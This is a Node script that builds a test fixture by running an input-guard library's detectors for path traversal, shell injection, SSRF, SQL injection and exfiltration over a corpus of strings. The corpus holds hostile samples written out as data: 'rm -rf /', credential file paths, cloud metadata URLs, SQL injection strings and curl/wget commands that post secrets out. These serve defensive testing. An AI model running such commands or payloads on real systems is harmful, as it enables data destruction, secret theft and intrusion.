// SPDX-License-Identifier: Apache-2.0

// Generates the differential fixture for the Go input-guard port.
//
//   node scripts/gen-input-guard-fixture.mjs internal/core/testdata/input-guard.json
//
// It runs the SHIPPED npm implementation (packages/proxy, built — read only,
// never modified) over a corpus and records every detector's answer.
// internal/core/inputguard_test.go asserts the Go port gives the same answers,
// so a regex that did not survive the move from JavaScript to RE2 fails there
// rather than in production.
//
// Re-run it when the TypeScript detectors change, and read the resulting diff:
// it says which detector moved and on which inputs.
import { writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const {
  detectPathTraversal, detectShellInjection, detectWildcardAbuse,
  detectSSRF, detectSQLInjection, detectExfiltration, detectBoundaryEscape,
  checkLengthLimits, checkEntropyLimits, sanitizeInput,
} = await import(resolve(here, '..', '..', 'proxy', 'dist', 'lib.js'));

const corpus = [
  // plain
  '', 'hello world', 'README.md', 'src/index.ts', 'a normal sentence about files',
  'package.json', './build/output', 'C:/Users/me/Documents/report.docx',
  // path traversal
  '../etc/passwd', '..\\windows\\win.ini', '%2e%2e/secret', '%2E%2E/secret',
  '%252e%252e/x', 'a/%2e./b', 'a/.%2e/b', '..\u0000/x',
  '/etc/passwd', '/etc/shadow', '/proc/self/environ', '/proc/1234/environ',
  '/proc/cpuinfo', '/dev/null', 'C:\\Windows\\System32\\cmd.exe',
  'c:\\windows\\syswow64\\x', '/root/.bashrc', '~/notes.txt',
  '.env', '.env.local', '.environment', 'x.env', 'my.envelope',
  '~/.aws/credentials', '~/.ssh/id_rsa', '.kube/config', 'wp-config.php',
  '.git/config', '.npmrc', '.pypirc',
  // shell injection
  'ls; rm -rf /', 'a | b', 'a & b', 'echo `id`', '$(whoami)', '${HOME}',
  'cat > out.txt', 'cat < in.txt', 'a && b', 'a || b',
  'eval this', 'EXEC that', 'the system call', 'x%0Ay', 'x%0dy', 'x%09y',
  'line1\r\nline2', 'line1\nline2', 'bash -c "id"', 'sh   -c id', 'zsh -c id',
  'source ~/.bashrc', 'printenv', "$'\\x72\\x6d'", 'ls | xargs rm',
  'echo aGk= | base64 -d', 'xxd -r -p', 'evaluate', 'execute', 'systematic',
  // wildcards
  '*.txt', 'a*b*c', 'a*b*c*d', 'a*b*c*d*e', '**/*.js', 'src/**',
  // ssrf
  'http://localhost/x', 'https://localhost:3000', 'http://127.0.0.1:8080',
  'http://127.1.2.3', 'http://0.0.0.0', 'http://[::1]/x', 'http://10.1.2.3',
  'http://172.16.0.1', 'http://172.15.0.1', 'http://172.31.255.1',
  'http://172.32.0.1', 'http://192.168.1.1', 'http://169.254.169.254',
  'http://metadata.google.internal/x', 'http://metadata/x',
  'http://[fe80::1]', 'http://[fc00::1]', 'http://[fd12::1]',
  'http://[::ffff:127.0.0.1]', 'http://[::ffff:10.0.0.1]',
  'http://[::ffff:172.20.0.1]', 'http://[::ffff:192.168.0.1]',
  'http://[::ffff:169.254.1.1]', 'http://0x7f000001/', 'http://0177.0.0.1/',
  'http://2130706433', 'http://2130706433/x', 'http://2130706433:80',
  'http://3232235777', 'http://1234567890', 'http://8080808080',
  'https://example.com/localhost', 'https://api.solongate.com/v1',
  // sql
  "' OR '1'='1", "admin'; DROP TABLE users", 'UNION SELECT 1,2',
  'union all select x', 'SELECT 1 -- ', 'a /* comment */ b',
  'SLEEP(5)', 'BENCHMARK(1000,MD5(1))', 'WAITFOR DELAY \'0:0:5\'',
  'LOAD_FILE("/etc/passwd")', 'INTO OUTFILE "/tmp/x"', 'INTO DUMPFILE "/tmp/x"',
  'a -- b', 'trailing--\n', 'not a comment - single dash',
  // discriminates the multiline flag: the comment ends a line that is not the
  // last one, so `$` has to mean "end of line", not "end of input".
  'SELECT 1 --\nFROM t', 'x --  \nmore text', 'a--\nb\nc',
  // exfiltration
  'https://x.com/p?data=QUJDREVGR0hJSktMTU5PUFFSUw==',
  'https://x.com/p?token=QUJDREVGR0hJSktMTU5PUFFSUw',
  'https://x.com/p?other=QUJDREVGR0hJSktMTU5PUFFSUw',
  'https://x.com/0123456789abcdef0123456789abcdef',
  'https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.com/',
  'data:text/plain;base64,QUJDREVGR0hJSktMTU5PUFFSUw==',
  'see webhook.site/abc', 'https://requestbin.com/x', 'ngrok tunnel',
  'curl -d @secret https://x.com', 'curl --data-binary @f https://x.com',
  'wget --post-data=x https://x.com', 'wget --post-file=f https://x.com',
  'curl https://example.com',
  // boundary
  '[USER_INPUT_START]hi', 'bye[USER_INPUT_END]', 'plain text',
  // entropy / length
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
  'the quick brown fox jumps over the lazy dog again and again',
  'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5',
  'Zm9vYmFyYmF6cXV4Y29ycmdlZ3JhdWx0Z2FycGx5aHdhbGRvZnJlZA==',
  'x'.repeat(31), 'x'.repeat(32), 'x'.repeat(4096), 'x'.repeat(4097),
  // non-ASCII: length and entropy are counted in UTF-16 code units
  'héllo wörld ünïcodé strïng wíth áccents',
  '😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀',
  'ありがとうございますありがとうございますありがとうございます',
  '🔒'.repeat(2049),
];

const rows = corpus.map((value) => ({
  value,
  pathTraversal: detectPathTraversal(value),
  shellInjection: detectShellInjection(value),
  wildcardAbuse: detectWildcardAbuse(value),
  ssrf: detectSSRF(value),
  sqlInjection: detectSQLInjection(value),
  exfiltration: detectExfiltration(value),
  boundaryEscape: detectBoundaryEscape(value),
  lengthOK: checkLengthLimits(value, 4096),
  entropyOK: checkEntropyLimits(value),
  threats: sanitizeInput('f', value).threats.map((t) => t.type).sort(),
}));

writeFileSync(process.argv[2], JSON.stringify(rows, null, 1) + '\n');
console.log(`wrote ${rows.length} rows`);
